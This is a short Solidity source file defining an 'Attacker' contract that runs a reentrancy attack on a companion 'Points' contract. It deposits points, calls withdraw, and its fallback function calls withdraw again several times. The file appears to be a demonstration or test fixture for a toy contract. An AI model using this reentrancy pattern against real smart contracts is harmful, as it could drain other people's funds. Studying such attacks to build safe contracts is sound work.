// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Points.sol";

// AttackerContract can perform a reentrancy attack on Points contract
contract Attacker {
    Points public points;
    Points public morePoints;
    uint public count = 0;

    constructor(
        address pointsAddress,
        address morePointsAddress
    ) {
        points = Points(pointsAddress);
        morePoints = Points(morePointsAddress);
    }

    // Function to trigger the reentrancy attack
    function attack() external {
        count = 0;
        // Deposit points to the Points contract
        morePoints.deposit(1);
        points.deposit(10);
        // Trigger the withdrawal, which leads to reentrancy
        points.withdraw(10);
        count = 0;
    }

    // Fallback function to recursively call the withdrawal function
    fallback() external {
        if (count < 3) {
            count += 1;
            // simulate move points to another contract
            points.withdraw(1);
            morePoints.deposit(1);
        }
    }

    // Function to check the attacker's balance
    function getPointsBalance() public view returns (uint) {
        return points.balances(address(this));
    }

    function getMorePointsBalance() public view returns (uint) {
        return morePoints.balances(address(this));
    }
}
